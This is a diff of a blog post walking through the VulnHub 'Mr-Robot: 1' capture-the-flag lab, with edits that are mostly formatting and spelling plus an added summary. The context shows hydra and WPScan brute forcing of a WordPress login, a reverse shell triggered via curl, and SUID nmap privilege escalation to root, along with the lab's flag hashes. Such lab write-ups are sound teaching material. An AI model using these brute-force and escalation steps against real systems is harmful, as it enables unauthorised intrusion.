@@ -8,9 +8,11 @@ image: "assets/images/binary.jpg"
 excerpt: "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras nulla nisi, gravida eget lacus sed, feugiat rhoncus lectus. Maecenas condimentum rutrum dolor, ut ultrices risus tempor vel. Mauris sed iaculis elit, id efficitur nulla. Morbi vitae purus et eros venenatis hendrerit quis non nibh. Suspendisse est turpis, ultricies et ipsum et, semper tincidunt ex. Phasellus accumsan enim nec arcu mollis ultricies. Suspendisse congue mi diam, ut auctor turpis faucibus ut."
 ---
 
+[Mr. Robot](https://www.imdb.com/title/tt4158110/) is one of the greatest TV shows ever made, and it is the most authentic representation of actual real life hacking to this day.
+
 [Mr-Robot: 1](https://www.vulnhub.com/entry/mr-robot-1,151/) has 3 flags to find.
 
-## Preparation
+# Preparation
 
 The virtual machines are placed onto the same isolated internal network where they can only communicate with each other.
 
@@ -22,7 +24,7 @@ marci@arch$ vboxmanage dhcpserver add --network=intnet --server-ip=10.38.1.1 --l
 
 The **Kali** machine received the IP address `10.38.1.110`.
 
-## Enumeration
+# Enumeration
 
 Launching **Mr. Robot**, we're presented with a login screen that cannot be bypassed as the login credentials aren't known.
 
@@ -62,7 +64,11 @@ Port [80](https://www.iana.org/assignments/service-names-port-numbers/service-na
 
 Looking up `10.38.1.111` in a web browser, we're presented with the clone of the promotion website of the [Mr. Robot TV series](https://www.imdb.com/title/tt4158110/).
 
-## Flag 1
+![fsociety](https://www.dropbox.com/s/mh5v8lc88k9r8tx/fsociety.png?dl=1)
+
+Checking the displayed commands won't get us anywhere close to the first flag.
+
+# Flag 1
 
 ### Nikto
 
@@ -109,7 +115,7 @@ kali@kali$ nikto -h 10.38.1.111
 
 `robots.txt` indicates that the server doesn't have an user agent, but it has two files:
 
-![robots](https://www.dropbox.com/s/49gd4p8jxetp3tu/robots.jpg?dl=1)
+![robots](https://www.dropbox.com/s/wqomn14tb6zo8qx/robots.png?dl=1)
 
 These files can be downloaded with **wget**:
 
@@ -125,9 +131,9 @@ kali@kali$ cat key-1-of-3.txt
 073403c8a58a1f80d943455fb30724b9
 ```
 
-## Flag 2
+# Flag 2
 
-As SSL isn't enabled on the WordPress login page, it may be bruteforced with the previously acquired dictionary file.
+As SSL isn't enabled on the WordPress login page, it may be brute forced with the previously acquired dictionary file.
 
 `fsocity.dic` contains duplicated entries that should be removed.
 
@@ -149,7 +155,7 @@ kali@kali$ wc -l wordlist.dic
 
 ### POST request
 
-To start the bruteforce attack, we need to intercept an http POST request in [Burp Suite](https://portswigger.net/burp).
+To start the brute force attack, we need to intercept an http POST request in [Burp Suite](https://portswigger.net/burp).
 
 
 > The [POST request](https://en.wikipedia.org/wiki/POST_(HTTP)) method requests that a web server accept the data enclosed in the body of the request message, most likely for storing it.
@@ -182,7 +188,7 @@ kali@kali$ hydra -V -L fsocity.dic -p 123 10.38.1.111 http-post-form '/wp-login.
 - `-L fsocity.dic` — Define dictionary
 - `-p 123` — Random unique password
 - `10.38.1.111` — IP of the vulnerable machine
-- `http-post-form` — An http POST form is being bruteforced
+- `http-post-form` — An http POST form is being brute forced
 - `/wp-login.php` — Path where the login form is located
 - `log=^USER^&pwd=^PASS&wp-submit=Log+In` — POST parameters to send, including placeholders
 - `F=Invalid Username` — Consider an attempt as failure if the response contains the text "Invalid Username".
@@ -197,7 +203,7 @@ kali@kali$ hydra -V -L fsocity.dic -p 123 10.38.1.111 http-post-form '/wp-login.
 
 ### WPScan
 
-**WPScan** can be used to find additional WordPress vulnerabilities and to bruteforce the password using the word list.
+**WPScan** can be used to find additional WordPress vulnerabilities and to brute force the password using the word list.
 
 ```sh
 kali@kali$ wpscan --url 10.28.1.111 --passwords /home/kali/mrrobot/wordlist.dic --usernames Elliot
@@ -249,7 +255,7 @@ To start the reverse shell, the 404 page can be called with **curl** in another 
 kail@kali$ curl http://10.38.1.111/404.php
 ```
 
-
+!!!!!!!!!!!!!!!!!
 
 ```sh
 10.38.1.111: inverse host lookup failed: Host name lookup failure
@@ -344,7 +350,7 @@ robot@linux:~$ cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
 ```
 
-## Flag 3
+# Flag 3
 
 Given that there is only one flag left, and we have not got root access to this box yet, this would have to be the next logical step.
 
@@ -404,7 +410,7 @@ robot@linux:~$ find / -perm -4000 2>/dev/null
 
 From the search result we can point out **nmap** - it's SUID bit is set, meaning that it can theoretically execute commands as root.
 
-The `nmap --help` command tells us that **nmap** has an `--interactive` option.
+The `nmap --help` command tells us that **nmap** has a `--interactive` option.
 
 ```sh
 robot@linux:~$ nmap --interactive
@@ -449,5 +455,24 @@ drwx------  2 root root 4096 Nov 13  2015 .cache
 
 ```sh
 # cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
+
+# Summary
+
+Mr. Robot is a great introduction to test our basic web application penetration testing skills: reconnaissance with Nmap, POST request capturing with Burp Suite, password cracking using bute force dictionary attack, establishing a reverse shell connection, and escalating privileges to gain root access.
+
+```sh
+cat key-1-of-3.txt
+073403c8a58a1f80d943455fb30724b9
+```
+
+```sh
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+```sh
+cat key-3-of-3.txt
 04787ddef27c3dee1ee161b21670b4e4
 ```
